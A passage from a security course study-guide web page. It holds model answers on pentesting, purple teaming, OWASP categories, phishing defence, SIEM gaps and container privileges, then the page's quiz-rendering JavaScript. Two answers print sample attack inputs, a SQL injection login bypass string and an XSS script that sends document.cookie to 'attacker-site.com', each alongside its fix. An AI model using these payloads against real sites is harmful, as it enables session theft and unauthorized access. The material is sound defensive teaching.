cheaply, but it can't tell you whether any given weakness is actually exploitable in context, or what an attacker could achieve by chaining several together.\n\n**Penetration test:**\n- *Depth:* moderate to deep \u2014 a human actively attempts to exploit specific findings (often starting from the vulnerability scan's output) to demonstrate real, chained impact within a defined, usually narrower scope (e.g. \"this one application\" or \"this one network segment\").\n- *Realism:* moderate \u2014 usually time-boxed (e.g. one to two weeks), with the target system's team often aware testing is happening, and testers typically working from a defined scope rather than a completely open-ended \"attack anything\" mandate.\n- *What it uniquely tells you:* whether a given vulnerability is *actually exploitable* and what real business impact results (e.g. \"this misconfigured S3 bucket doesn't just theoretically expose data \u2014 I actually downloaded 10,000 customer records from it\") \u2014 turning a list of theoretical weaknesses into demonstrated, prioritized risk.\n\n**Red team engagement:**\n- *Depth:* deepest \u2014 simulates a full, realistic adversary campaign across the whole organisation (technical systems, people via phishing, and process), not scoped to one application or system.\n- *Realism:* highest \u2014 often run without the blue team's advance knowledge (unlike a typical pentest), over a longer timeframe, using realistic attacker tradecraft (the attack lifecycle stages) rather than just testing a checklist of known vulnerability classes.\n- *What it uniquely tells you:* not just \"what vulnerabilities exist\" but \"would our organisation actually detect and respond to a real attack in progress\" \u2014 testing the human/process/detection layer that neither a vulnerability scan nor a typical scoped pentest is designed to evaluate.\n\n**The relationship between them:** each successive method trades speed/cost/breadth for realism/depth. A mature security program typically uses all three for different purposes \u2014 frequent automated scanning for broad, continuous coverage; periodic penetration tests for deep validation of specific, high-risk systems; and occasional red team engagements to validate the organisation's actual detect-and-respond capability under realistic conditions, which no amount of scanning or scoped pentesting can substitute for."}, {"id": "t3", "q": "Explain why \"purple teaming\" (a collaborative red/blue exercise) produces faster improvement in detection capability than running a red team engagement and only sharing results in a final report afterward.", "answer": "**The traditional (non-purple) sequence:** the red team operates, often without the blue team's knowledge, for the full duration of the engagement (days to weeks). Only at the *end* does the blue team learn what techniques were used, what was detected, and what wasn't \u2014 all as a single, retrospective report. This means: (1) the blue team gets exactly one feedback cycle for the entire engagement, no matter how many distinct techniques the red team actually used; (2) any detection gap discovered on day one of a two-week engagement continues to go undetected for the *entire remaining duration*, since there's no mechanism to fix and re-test it mid-engagement; (3) by the time the report arrives, specific technical details (exact command syntax used, exact timing) may be harder to reconstruct precisely than if they'd been discussed immediately.\n\n**How purple teaming changes this:** red and blue actively collaborate *during* the exercise \u2014 e.g. the red team executes a specific technique, then immediately (or very soon after) discusses it with the blue team: did you see this? If not, why not \u2014 was there no log source covering it, or was the log present but no alert rule fired on it, or did an alert fire but get missed/deprioritized? This creates a **tight feedback loop**: the blue team can potentially write or tune a new detection rule *within the same session*, and then the red team can immediately re-run the same (or a variant) technique to test whether the new detection actually works \u2014 turning one long engagement into many small, fast iterate-and-verify cycles rather than one big cycle.\n\n**Why this produces faster improvement:** detection engineering, like most engineering, benefits enormously from fast feedback \u2014 the earlier a gap is identified and the sooner a fix can be tested against the exact scenario that exposed it, the faster genuine capability improves. A single end-of-engagement report is analogous to a long-batch release cycle with one big feedback point at the end; purple teaming is analogous to a much tighter, continuous feedback loop \u2014 the same underlying principle behind why fast CI feedback accelerates software quality improvement applies directly to accelerating detection-engineering improvement here."}, {"id": "t4", "q": "A web application's login form builds its SQL query as: `\"SELECT * FROM users WHERE username = '\" + input + \"'\"`. Explain exactly how an attacker could exploit this with SQL injection, what a successful attack would achieve, and how to fix the code.", "answer": "**How the exploit works:** the application takes the `input` variable directly from user-supplied text and concatenates it, unmodified, into the middle of a SQL query string. The query as intended looks like:\n```sql\nSELECT * FROM users WHERE username = 'alice'\n```\nif the user typed `alice`. But because the input is concatenated as raw text rather than treated as pure data, an attacker can submit input that contains SQL syntax rather than just a plain username. For example, if the attacker submits:\n```\n' OR '1'='1\n```\nthe resulting query becomes:\n```sql\nSELECT * FROM users WHERE username = '' OR '1'='1'\n```\nBecause `'1'='1'` is always true, and it's joined with `OR`, the `WHERE` clause now evaluates to true for **every row** in the `users` table, regardless of the actual username \u2014 the single quote in the attacker's input closed the string literal early, and everything after it became literal SQL that the database engine executes as part of the query's logic, not as inert text.\n\n**What a successful attack achieves:** depending on exactly how the application uses the query's result, this could let an attacker log in as an arbitrary (e.g. the first) user in the table without knowing any valid password, since the query now returns every row instead of just the one matching a legitimate username. A more advanced injection (e.g. using `UNION SELECT` clauses) could let the attacker extract entirely unrelated data from the database \u2014 reading other tables (password hashes, other users' personal data) that the login query was never intended to expose at all.\n\n**The fix \u2014 parameterised queries / prepared statements:** instead of building the query by string concatenation, the application should use a parameterised query, where the user's input is passed as a separate, explicitly-typed *parameter* rather than being spliced into the SQL text itself:\n```sql\n-- Parameterised (safe): input is bound as data, never interpreted as SQL syntax\nSELECT * FROM users WHERE username = ?\n-- driver binds `input` here, e.g.: stmt.execute([input])\n```\nWith this approach, even if `input` literally contains the text `' OR '1'='1`, the database driver treats the entire string as a single literal *value* to compare against the `username` column \u2014 it can never be interpreted as SQL syntax that alters the query's structure, because the boundary between \"the query's code\" and \"the query's data\" is enforced by the database driver itself, not by hoping the input never contains a stray quote character."}, {"id": "t5", "q": "Explain the difference between what an XSS attack directly achieves and what a Content-Security-Policy specifically prevents, using a concrete scenario: a malicious script trying to send a user's session cookie to an external server.", "answer": "**What the XSS attack achieves on its own:** suppose a comment field on a page doesn't properly escape user input before rendering it back to other visitors. An attacker submits a comment containing:\n```html\n<script>fetch('https://attacker-site.com/steal?cookie=' + document.cookie)<\/script>\n```\nIf the application renders this comment unescaped, any other user who views the page containing that comment has this script silently execute *in their own browser*, in the security context of the legitimate site. The script reads `document.cookie` (which, if the session cookie isn't marked `HttpOnly`, includes the victim's actual session token) and sends it via a network request to `attacker-site.com`. The attacker now has the victim's session cookie and can use it to impersonate that victim on the legitimate site \u2014 this is the core XSS impact: **arbitrary attacker-controlled script executing with the victim's own browser privileges and access to the victim's own session state.**\n\n**What a Content-Security-Policy (CSP) specifically prevents:** a CSP is an HTTP response header the server sends, telling the *browser* which sources of script/content are allowed to load and execute on that page, and \u2014 critically for this scenario \u2014 which network destinations the page is allowed to send requests to (via the `connect-src` directive) and whether inline `<script>` tags are allowed to execute at all (via the `script-src` directive, which can disallow `'unsafe-inline'`). A well-configured CSP addresses this attack at **two separate points**:\n1. **Preventing the injected script from executing at all:** if `script-src` disallows inline scripts (`'unsafe-inline'` not permitted) and requires scripts to come from a specific, trusted origin, the browser will simply refuse to execute the attacker's injected `<script>` tag in the first place, regardless of the underlying escaping bug that let it get into the page's HTML.\n2. **Even if a script does execute, limiting where it can send data:** if `connect-src` is restricted to only the application's own legitimate API domains, a `fetch()` call to `attacker-site.com` would be blocked by the browser itself, even if some other injected script *did* manage to execute \u2014 the exfiltration step specifically fails.\n\n**Why both matter, and why CSP is a defense-in-depth layer rather than a substitute for fixing the underlying bug:** CSP doesn't fix the actual vulnerability (unescaped output allowing script injection in the first place) \u2014 proper output encoding/escaping is still required to prevent the injection from landing in the page at all. CSP is a *second, independent* layer that limits the *blast radius* if the first layer (escaping) somehow fails or is missed somewhere \u2014 exactly the \"defense in depth\" principle: even if one control fails, another independent control can still prevent or limit the resulting harm."}, {"id": "t6", "q": "Using the OWASP Top 10 categories, explain why \"Security Misconfiguration\" and \"Vulnerable and Outdated Components\" are conceptually different failure modes, even though both can result in the same outcome (a compromised system). Give a concrete example of each.", "answer": "**The conceptual difference:**\n- **Security Misconfiguration** is about *how a system that is otherwise up-to-date and free of known code vulnerabilities is set up and operated* \u2014 the software itself may be perfectly current and unpatched-vulnerability-free, but a human (or a default setting left unchanged) has configured it in a way that creates a weakness. The failure lives in *configuration decisions*, not in the software's own code.\n- **Vulnerable and Outdated Components** is about *using software that itself contains a known, publicly documented weakness* \u2014 the code being run has an actual, identifiable flaw (typically tracked as a CVE), regardless of how carefully it's configured. The failure lives in *what version of code is running*, not in how it's set up.\n\n**Concrete example of Security Misconfiguration:** a cloud storage bucket (e.g. an S3 bucket) is created with its access permissions left at an overly permissive default \u2014 publicly readable by anyone on the internet \u2014 because whoever set it up didn't explicitly restrict access. The storage software itself has no bug; nothing here corresponds to a CVE. The problem is entirely a configuration choice (or lack of one) that exposed data that should have been private. Fixing this means changing a setting, not upgrading any software.\n\n**Concrete example of Vulnerable and Outdated Components:** an application depends on a logging library with a publicly disclosed remote-code-execution vulnerability (a real-world example being the Log4Shell vulnerability in the Log4j library). Even with a perfectly configured server, correctly restricted permissions, and no misconfiguration anywhere, simply *having this specific vulnerable library version present and reachable* is enough for an attacker to exploit it directly \u2014 the flaw is baked into the code itself. Fixing this means upgrading the dependency to a patched version, not changing any configuration setting.\n\n**Why the distinction matters practically:** the two require entirely different remediation processes and different tooling to detect. Security misconfiguration is caught by configuration auditing/scanning (checking settings against a secure baseline); vulnerable components are caught by dependency/CVE scanning (checking installed package versions against a vulnerability database \u2014 exactly the NuGet/build-warning mechanism covered in the DevSecOps material). A team that only runs one type of check (say, only dependency scanning) would completely miss a misconfigured storage bucket, and vice versa \u2014 both checks are needed because they address structurally different root causes, even though an attacker exploiting either one might achieve a similarly severe outcome (unauthorized data access or system compromise)."}, {"id": "t7", "q": "Why does \"defense in depth\" specifically matter in a scenario where a red team achieves initial access via phishing \u2014 a vector no purely technical control can prevent 100% of the time? What should stop that initial foothold from becoming full compromise?", "answer": "**Why phishing is a special case:** unlike a purely technical vulnerability (a missing patch, a misconfigured setting), phishing targets human judgment directly \u2014 no technical control can guarantee a human will never, under any circumstances, click a convincing-enough malicious link or attachment, no matter how much security awareness training is provided. Organisations should absolutely still invest in reducing the *likelihood* (email filtering, training, suspicious-sender warnings), but treating \"zero successful phishing attempts, ever\" as an achievable technical guarantee is unrealistic \u2014 which is exactly why defense in depth matters here specifically: the design has to assume that initial access via phishing will, at some point, succeed, and ask \"what happens *after* that.\"\n\n**What should stop the initial foothold from becoming full compromise, layer by layer:**\n1. **Least privilege on the compromised account/machine:** if the phished employee's account and laptop only have the minimum access actually needed for their job (not local administrator rights by default, not broad access to sensitive systems \"just in case\"), the attacker's initial foothold is inherently limited in what it can immediately do or reach \u2014 this directly blocks or slows the \"privilege escalation\" stage of the attack lifecycle.\n2. **Network segmentation:** if the compromised laptop sits on a network segment that cannot directly reach sensitive internal systems (databases, domain controllers) without passing through additional controls, the \"lateral movement\" stage is significantly harder \u2014 the attacker can't simply pivot straight from a compromised laptop to critical infrastructure.\n3. **Endpoint detection and monitoring (feeding the SIEM):** even if the phishing succeeds and malware executes, endpoint detection tooling monitoring for suspicious process behaviour (e.g. a Word document spawning a PowerShell process, unusual outbound network connections) gives the blue team a chance to catch and contain the compromise *before* it progresses further through the attack lifecycle.\n4. **Multi-factor authentication (MFA):** even if the phishing attack successfully harvests a password, MFA means that password alone isn't sufficient to actually authenticate as that user \u2014 significantly raising the bar even after a \"successful\" phishing click, unless the phishing attack specifically also captured an MFA token/session (a harder, more sophisticated attack).\n\n**The defense-in-depth argument, stated directly:** since no single control (training, email filtering) can be trusted to stop 100% of phishing attempts, the system's overall security cannot depend on that one layer succeeding every time. Each subsequent layer (least privilege, segmentation, monitoring, MFA) exists precisely to contain the damage *given that the previous layer will eventually fail for at least one employee, at some point* \u2014 which is exactly the scenario a red team phishing exercise is designed to test and validate."}, {"id": "t8", "q": "A blue team's SIEM did not generate any alert during a red team's successful multi-day engagement, despite the red team achieving domain admin access and exfiltrating test data. Using the concepts of detection engineering and incident response, explain what this outcome reveals and what should happen next.", "answer": "**What this outcome reveals:** a complete absence of alerts across a multi-day engagement that achieved domain admin access and exfiltration is a severe finding \u2014 arguably more severe than any single technical vulnerability the red team might have exploited along the way. It indicates one or more of the following gaps, each of which needs to be investigated separately:\n1. **Missing log coverage:** the systems/actions the red team touched (e.g. a specific server, a specific type of authentication event, outbound network traffic to an unusual destination) may simply not be generating logs that reach the SIEM at all \u2014 you cannot detect what you cannot see, regardless of how good your detection rules are.\n2. **Missing or poorly-tuned detection rules:** the relevant logs may be present in the SIEM, but no rule exists that correlates them into an actionable alert \u2014 e.g. the SIEM has a record of the lateral movement events, but nothing is configured to flag \"this account authenticated to five systems it's never touched before, within ten minutes\" as suspicious.\n3. **Alert fatigue / process failure:** an alert may have actually fired, but was missed, deprioritized, or drowned out among a high volume of low-value alerts the blue team has learned to ignore \u2014 a process and tooling-tuning problem rather than a pure detection-engineering gap.\n\n**What should happen next \u2014 this maps directly onto both detection engineering and incident response practice:**\n- **Immediate:** even though this was a simulated exercise, the exact same technical actions (domain admin compromise, data exfiltration) by a genuine attacker would have gone completely unnoticed \u2014 this should be treated with the same urgency as if it were a real, ongoing incident that was just discovered retrospectively. A retrospective incident response process should still run: understand exactly what was accessed/exfiltrated (even though it was test data this time), and confirm no other, unrelated compromise is also present and equally undetected.\n- **Root cause, per finding:** for each of the gap categories above, the fix differs \u2014 missing log coverage requires onboarding new log sources to the SIEM; missing detection rules requires detection engineering work (writing and testing new correlation rules against the specific techniques the red team used); alert fatigue requires tuning existing rules to reduce noise and/or improving the blue team's triage process.\n- **Verification via purple teaming:** rather than assuming the newly written detection rules will work, the ideal next step is exactly what purple teaming enables \u2014 have the red team re-run the same (or similar) techniques against the newly instrumented environment, to confirm the gap has actually closed, rather than treating \"we wrote a new rule\" as sufficient proof on its own.\n- **Broader lesson:** this result is a textbook argument for *why* red team exercises (and not just vulnerability scans or scoped pentests) are run in the first place \u2014 a vulnerability scan or standard pentest report would have told the organisation about individual weaknesses, but only a live exercise like this one reveals that the organisation's actual ability to *detect* a full, successful, multi-day compromise is currently zero \u2014 an operational finding no amount of patching alone would have surfaced."}, {"id": "t9", "q": "Explain the relationship between credential stuffing and password reuse across services \u2014 why is this attack effective even against a service that itself has never been breached?", "answer": "**How credential stuffing works mechanically:** when Service A suffers a data breach and usernames/passwords are leaked (often published or sold), an attacker doesn't need to breach Service B directly at all \u2014 they simply take the leaked username/password pairs from Service A's breach and automatically try them, at scale, against Service B's login endpoint. If a user reused the same password across both services, the attacker successfully logs into Service B using credentials that were never actually stolen *from* Service B.\n\n**Why it works even against a service with a spotless security record:** the vulnerability being exploited isn't a flaw in Service B's code, infrastructure, or configuration at all \u2014 Service B could have flawless input validation, no SQL injection risk, perfectly patched dependencies, and a strong SIEM, and credential stuffing would still succeed, because **the actual weak point is the human behaviour of reusing the same password across multiple, entirely unrelated services.** Service B's own security posture is largely irrelevant to whether this specific attack succeeds; what matters is whether *any* other service the same user has an account with was ever breached, and whether that user reused a password across both.\n\n**Why this makes credential stuffing structurally different from most other attacks in this material:** almost every other technique discussed (SQL injection, XSS, exploiting a vulnerable component, exploiting a misconfiguration) targets a specific weakness *in the target system itself*. Credential stuffing instead exploits an externality \u2014 a weakness in a completely different, unrelated system (wherever the credentials originally leaked from), combined with a common human habit (password reuse) that the target service has limited direct control over.\n\n**What a service can still do to defend against it, despite not controlling the root cause:** enforce multi-factor authentication (so a correct password alone is insufficient); monitor and rate-limit login attempts for patterns consistent with automated credential-stuffing (e.g. a burst of login attempts across many different usernames from the same source in a short window); check submitted credentials against known-breached-password databases at signup/login time and prompt a password change if a match is found; and, at the individual level, encourage (or technically enforce, via a password manager integration) unique passwords per service \u2014 none of which \"fix\" the root cause (reuse habits and other services' breaches) but all of which reduce the service's own exposure to an attack whose origin lies entirely outside its own walls."}, {"id": "t10", "q": "A company's security policy states: \"We run automated vulnerability scans monthly, so we don't need a red team engagement.\" Critique this position using the distinction between vulnerability scanning and red/blue exercises.", "answer": "This position conflates two fundamentally different activities that answer different questions, and relying on one as a substitute for the other leaves a significant blind spot.\n\n**What monthly vulnerability scanning actually validates:** it answers \"does this system currently match a known-bad pattern from our scanner's signature database?\" \u2014 known CVEs in installed software, common misconfigurations the scanner is programmed to check for, missing patches. This is valuable, cheap, and should absolutely continue \u2014 but it is fundamentally a check against *known, previously catalogued* weaknesses, run by a tool with no understanding of the specific business logic, no ability to chain multiple minor findings into a demonstrated real-world compromise, and \u2014 critically for this critique \u2014 **no ability to test the human and process layer at all.**\n\n**What it does not validate, and what only a red/blue exercise can:**\n1. **Whether the organisation would actually detect a real attack in progress.** A vulnerability scan tells you nothing about whether your SIEM has the right log sources connected, whether your detection rules would actually fire on realistic attacker behaviour, or how quickly your team would notice and respond. An organisation could have a perfect scan report (zero known vulnerabilities found) and still have zero actual detection capability \u2014 these are entirely independent properties, and the scenario in an earlier question (a full multi-day compromise producing zero SIEM alerts) illustrates exactly this gap.\n2. **Novel or chained weaknesses a signature-based scanner cannot recognize.** A scanner checks against known patterns; it cannot discover a business-logic flaw specific to this application (e.g. \"if you submit a negative quantity, the discount calculation underflows and produces a negative total, effectively paying the customer\") or a creative chain of several individually-minor findings that together produce serious impact \u2014 exactly the kind of finding a skilled human tester specifically looks for.\n3. **The human/social-engineering attack surface entirely.** No vulnerability scanner tests whether an employee would click a phishing link, or whether an attacker could talk their way past a help desk's identity-verification process \u2014 real-world breaches very frequently start exactly here, and this attack surface is completely outside what a monthly automated scan can ever assess.\n\n**The correct framing:** monthly vulnerability scanning and periodic red team engagements are complementary, not substitutable \u2014 one provides continuous, broad, shallow coverage of known technical weaknesses; the other provides periodic, deep, realistic validation of the organisation's actual detect-and-respond capability against a full-spectrum simulated adversary. Relying only on the former means the organisation genuinely does not know whether it could detect and stop a real, sophisticated attacker \u2014 a risk a monthly scan report, however clean, cannot speak to at all."}, {"id": "t11", "q": "Connect the OWASP \"Vulnerable and Outdated Components\" risk category to the DevSecOps/CVE material covered earlier. Explain concretely how a well-integrated DevSecOps pipeline (dependency scanning at build time) reduces the attack surface a red team would find during this specific category of testing.", "answer": "**The direct connection:** the DevSecOps material describes exactly the mechanism by which \"Vulnerable and Outdated Components\" gets caught *before* it ever becomes something a red team could exploit \u2014 automated dependency/CVE scanning integrated directly into the build step (the specific example being NuGet's package restore automatically emitting warnings like `NU1903`/`NU1902` when a resolved package version matches a known CVE in the vulnerability database). This is the DevSecOps principle \u2014 \"security integrated throughout the loop,\" not a single final gate \u2014 applied specifically to this exact OWASP risk category.\n\n**How this concretely reduces what a red team finds:** without this pipeline integration, an application might accumulate outdated, vulnerable dependencies silently over time \u2014 a library gets pinned at a specific version when the project starts, and unless someone manually and regularly checks each dependency against a vulnerability database, a newly disclosed CVE affecting an already-installed library goes completely unnoticed by the development team, sitting in production as a live, exploitable weakness until a red team (or a real attacker) specifically probes for and finds it \u2014 potentially months or years after the CVE was actually disclosed publicly.\n\nWith automated dependency scanning wired into every build (per the DevSecOps material's example), the same vulnerability is instead surfaced to a developer **the moment it's disclosed and the next build runs** \u2014 turning \"silently vulnerable for months until someone tests for it\" into \"flagged and fixable within the normal development cycle, typically within days.\" A red team probing an application protected by this pipeline is far less likely to find an exploitable known-CVE dependency at all, specifically *because* the organisation isn't relying on periodic red team testing to be the first line of defense against this risk category \u2014 it's caught continuously, automatically, and far earlier in the pipeline.\n\n**Why this matters for how a security program should be structured:** this illustrates a broader principle connecting both lecture topics \u2014 DevSecOps tooling (dependency scanning, SAST, secret scanning) should handle the *known, mechanically-detectable* categories of risk (like outdated components) continuously and automatically, freeing red team engagements to focus their limited, expensive, human-driven time on what automated tooling structurally *cannot* find: novel business-logic flaws, creative attack chains, and the human/process layer. A red team repeatedly finding basic outdated-dependency issues during their engagement is itself a finding \u2014 it indicates the organisation's DevSecOps pipeline has a gap, since this specific risk category should ideally already be caught continuously, long before a periodic red team exercise ever gets a chance to look for it."}, {"id": "t12", "q": "Using a concrete example \u2014 a web application container running as root, compromised via a vulnerability in the application code \u2014 explain the specific consequence of running \"as root\" in this scenario, and how a defense-in-depth approach would have reduced the impact even if the application vulnerability itself couldn't be prevented.", "answer": "**The scenario:** a web application has an exploitable vulnerability in its own code (e.g. a deserialization flaw, or a command injection bug) that lets an attacker achieve arbitrary code execution *within the application's own process*. Critically, that process is running as the `root` user inside its container.\n\n**The specific consequence of running as root:** the moment the attacker achieves code execution, whatever commands they run execute with **root's full privileges** within that container \u2014 unrestricted read/write access to the entire container's filesystem (including anything mounted into it, like configuration files, secrets, or shared volumes), the ability to install additional tooling, modify system binaries, and \u2014 if the container's isolation is ever imperfect (a container escape vulnerability, or an overly permissive container configuration such as a mounted Docker socket) \u2014 potentially escalate straight to root on the underlying host itself. Privilege escalation, which in many other scenarios requires the attacker to find and exploit a *separate* vulnerability after their initial foothold, is essentially handed to them for free the instant the application-level vulnerability is triggered, because the process they compromised already had maximal privileges.\n\n**How defense in depth would have reduced the impact, even without preventing the original application vulnerability:** the application code vulnerability itself might genuinely be hard to prevent entirely (any sufficiently complex application has some non-zero risk of an undiscovered bug) \u2014 but several independent layers could have limited what that specific vulnerability was able to achieve once triggered:\n1. **Running the container process as a non-root user** (e.g. a dedicated low-privilege user, exactly the `USER node`-style practice from the CI/CD material): the exact same code-execution vulnerability would now only grant the attacker the privileges of that unprivileged user \u2014 unable to modify most of the filesystem, unable to install system packages, and critically, if a container escape did somehow occur, the escaped process would be an unprivileged user on the host rather than root.\n2. **Read-only filesystem mounts where write access isn't actually needed:** even with code execution, the attacker couldn't modify application binaries or configuration if the filesystem is mounted read-only.\n3. **Network segmentation limiting what the compromised container can reach:** even with code execution inside the container, if that container's network access is restricted to only the specific downstream services it legitimately needs, the attacker's ability to pivot/laterally move from this one compromised container to the rest of the environment is significantly constrained.\n4. **Runtime monitoring/EDR-style detection on the container:** unusual process behaviour (the web application process suddenly spawning a shell, or making unexpected outbound network connections) can be detected and alerted on, even if the initial exploitation itself wasn't prevented \u2014 feeding into the same SIEM/detection-engineering loop discussed earlier.\n\n**The overall point:** none of these four layers required successfully preventing the original application vulnerability \u2014 each one independently reduces the *consequence* of that vulnerability being exploited, which is precisely what defense in depth means: accepting that any single layer (in this case, \"the application code has zero vulnerabilities\") cannot be guaranteed, and ensuring that its failure doesn't automatically cascade into the worst possible outcome (full host compromise)."}]}</script>
+<script>
+/* ============================================================
+   CT3 Study Guides — shared app engine
+   Identical across every lecture file. Reads window.LECTURE_DATA.
+   ============================================================ */
+
+(function () {
+  "use strict";
+
+  /* ---------------- tiny markdown renderer ---------------- */
+  /* Supports: ## / ### headers, **bold**, `code`, ```fenced code```,
+     GFM pipe tables, "- " unordered lists, "---" hr, paragraphs. */
+
+  function escapeHtml(s) {
+    return s
+      .replace(/&/g, "&amp;")
+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;");
+  }
+
+  function inline(s) {
+    let out = escapeHtml(s);
+    out = out.replace(/`([^`]+)`/g, "<code>$1</code>");
+    out = out.replace(/\*\*([^*]+)\*\*/g, "<strong>$1</strong>");
+    return out;
+  }
+
+  function renderTable(rows) {
+    const header = rows[0];
+    const body = rows.slice(2);
+    const cell = (r) =>
+      r
+        .trim()
+        .replace(/^\|/, "")
+        .replace(/\|$/, "")
+        .split("|")
+        .map((c) => c.trim());
+    let html = "<table><thead><tr>";
+    cell(header).forEach((c) => (html += `<th>${inline(c)}</th>`));
+    html += "</tr></thead><tbody>";
+    body.forEach((r) => {
+      html += "<tr>";
+      cell(r).forEach((c) => (html += `<td>${inline(c)}</td>`));
+      html += "</tr>";
+    });
+    html += "</tbody></table>";
+    return html;
+  }
+
+  function renderMarkdown(md) {
+    const lines = md.replace(/\r\n/g, "\n").split("\n");
+    let html = "";
+    let i = 0;
+    let para = [];
+
+    function flushPara() {
+      if (para.length) {
+        html += `<p>${inline(para.join(" "))}</p>`;
+        para = [];
+      }
+    }
+
+    while (i < lines.length) {
+      const line = lines[i];
+
+      if (/^```/.test(line)) {
+        flushPara();
+        const lang = line.replace(/^```/, "").trim();
+        const code = [];
+        i++;
+        while (i < lines.length && !/^```/.test(lines[i])) {
+          code.push(lines[i]);
+          i++;
+        }
+        html += `<pre><code class="lang-${escapeHtml(lang || "text")}">${escapeHtml(
+          code.join("\n")
+        )}</code></pre>`;
+        i++;
+        continue;
+      }
+
+      if (/^\s*\|/.test(line) && i + 1 < lines.length && /^\s*\|?\s*-+\s*(\|\s*-+\s*)*\|?\s*$/.test(lines[i + 1])) {
+        flushPara();
+        const rows = [];
+        while (i < lines.length && /^\s*\|/.test(lines[i])) {
+          rows.push(lines[i]);
+          i++;
+        }
+        html += renderTable(rows);
+        continue;
+      }
+
+      if (/^###\s+/.test(line)) {
+        flushPara();
+        html += `<h3>${inline(line.replace(/^###\s+/, ""))}</h3>`;
+        i++;
+        continue;
+      }
+
+      if (/^##\s+/.test(line)) {
+        flushPara();
+        html += `<h2>${inline(line.replace(/^##\s+/, ""))}</h2>`;
+        i++;
+        continue;
+      }
+
+      if (/^-\s+/.test(line)) {
+        flushPara();
+        const items = [];
+        while (i < lines.length && /^-\s+/.test(lines[i])) {
+          items.push(lines[i].replace(/^-\s+/, ""));
+          i++;
+        }
+        html += "<ul>" + items.map((it) => `<li>${inline(it)}</li>`).join("") + "</ul>";
+        continue;
+      }
+
+      if (/^---+\s*$/.test(line)) {
+        flushPara();
+        html += "<hr>";
+        i++;
+        continue;
+      }
+
+      if (line.trim() === "") {
+        flushPara();
+        i++;
+        continue;
+      }
+
+      para.push(line.trim());
+      i++;
+    }
+    flushPara();
+    return html;
+  }
+
+  /* ---------------- utils ---------------- */
+
+  function shuffle(arr) {
+    const a = arr.slice();
+    for (let i = a.length - 1; i > 0; i--) {
+      const j = Math.floor(Math.random() * (i + 1));
+      [a[i], a[j]] = [a[j], a[i]];
+    }
+    return a;
+  }
+
+  function storageGet(key) {
+    try {
+      const raw = localStorage.getItem(key);
+      return raw ? JSON.parse(raw) : null;
+    } catch (e) {
+      return null;
+    }
+  }
+
+  function storageSet(key, val) {
+    try {
+      localStorage.setItem(key, JSON.stringify(val));
+    } catch (e) {
+      /* ignore quota / private-mode errors */
+    }
+  }
+
+  /* ---------------- tabs ---------------- */
+
+  function initTabs() {
+    const tabs = document.querySelectorAll(".section-tab");
+    const panels = document.querySelectorAll(".section-panel");
+    tabs.forEach((tab) => {
+      tab.addEventListener("click", () => {
+        tabs.forEach((t) => t.classList.remove("active"));
+        panels.forEach((p) => p.classList.remove("active"));
+        tab.classList.add("active");
+        document.getElementById(tab.dataset.target).classList.add("active");
+        window.scrollTo({ top: 0, behavior: "instant" in window ? "instant" : "auto" });
+      });
+    });
+  }
+
+  /* ---------------- content ---------------- */
+
+  function renderContent(data) {
+    const el = document.getElementById("content-body");
+    if (el) el.innerHTML = renderMarkdown(data.contentMarkdown);
+  }
+
+  /* ---------------- MCQ engine ---------------- */
+
+  function mcqStorageKey(id) {
+    return `ct3-quiz-${id}`;
+  }
+
+  function newMcqState(data) {
+    const ids = data.mcqs.map((q) => q.id);
+    const order = shuffle(ids);
+    const optionOrder = {};
+    data.mcqs.forEach((q) => {
+      optionOrder[q.id] = shuffle(q.options.map((_, idx) => idx));
+    });
+    return { order, optionOrder, answers: {} };
+  }
+
+  function initQuiz(data) {
+    const key = mcqStorageKey(data.id);
+    let state = storageGet(key);
+    if (!state || !state.order || state.order.length !== data.mcqs.length) {
+      state = newMcqState(data);
+      storageSet(key, state);
+    }
+
+    const byId = {};
+    data.mcqs.forEach((q) => (byId[q.id] = q));
+
+    const list = document.getElementById("mcq-list");
+    const scoreEl = document.getElementById("quiz-score");
+    const barEl = document.getElementById("quiz-progress-fill");
+    const total = data.mcqs.length;
+
+    function updateScore() {
+      const answeredIds = Object.keys(state.answers);
+      const correctCount = answeredIds.filter((id) => state.answers[id].correct).length;
+      scoreEl.innerHTML = `<b>${correctCount}</b> / ${answeredIds.length} correct &nbsp;·&nbsp; ${answeredIds.length} / ${total} answered`;
+      barEl.style.width = `${(answeredIds.length / total) * 100}%`;
+    }
+
+    function renderQuestion(qid, displayIndex) {
+      const q = byId[qid];
+      const wrap = document.createElement("div");
+      wrap.className = "mcq-card";
+      const already = state.answers[qid];
+
+      const qEl = document.createElement("p");
+      qEl.className = "mcq-q";
+      qEl.innerHTML = `<span class="mcq-index">${displayIndex + 1}.</span><span>${inline(q.q)}</span>`;
+      wrap.appendChild(qEl);
+
+      const optsWrap = document.createElement("div");
+      optsWrap.className = "mcq-options";
+
+      const order = state.optionOrder[qid];
+      order.forEach((origIdx) => {
+        const btn = document.createElement("button");
+        btn.className = "mcq-option";
+        btn.innerHTML = inline(q.options[origIdx]);
+        btn.disabled = !!already;
+
+        if (already) {
+          if (origIdx === q.correct) btn.classList.add("correct");
+          else if (origIdx === already.chosen) btn.classList.add("incorrect");
+        }
+
+        btn.addEventListener("click", () => {
+          if (state.answers[qid]) return;
+          const correct = origIdx === q.correct;
+          state.answers[qid] = { chosen: origIdx, correct };
+          storageSet(mcqStorageKey(data.id), state);
+
+          Array.from(optsWrap.children).forEach((b) => (b.disabled = true));
+          if (correct) {
+            btn.classList.add("correct");
+          } else {
+            btn.classList.add("incorrect");
+            Array.from(optsWrap.children)[order.indexOf(q.correct)].classList.add("reveal-correct");
+          }
+          expl.classList.add("show");
+          updateScore();
+        });
+
+        optsWrap.appendChild(btn);
+      });
+
+      wrap.appendChild(optsWrap);
+
+      const expl = document.createElement("div");
+      expl.className = "mcq-explanation" + (already ? " show" : "");
+      expl.innerHTML = `<b>Why:</b> ${inline(q.explanation)}`;
+      wrap.appendChild(expl);
+
+      return wrap;
+    }
+
+    function render() {
+      list.innerHTML = "";
+      state.order.forEach((qid, idx) => list.appendChild(renderQuestion(qid, idx)));
+      updateScore();
+    }
+
+    document.getElementById("quiz-reset").addEventListener("click", () => {
+      state = newMcqState(data);
+      storageSet(key, state);
+      render();
+      document.getElementById("mcq-panel-top").scrollIntoView({ behavior: "smooth" });
+    });
+
+    render();
+  }
+
+  /* ---------------- technical questions engine ---------------- */
+
+  function techStorageKey(id) {
+    return `ct3-tech-${id}`;
+  }
+
+  function initTech(data) {
+    const key = techStorageKey(data.id);
+    let state = storageGet(key) || { reviewed: {} };
+
+    const list = document.getElementById("tech-list");
+    const counterEl = document.getElementById("tech-counter");
+    const total = data.techQuestions.length;
+
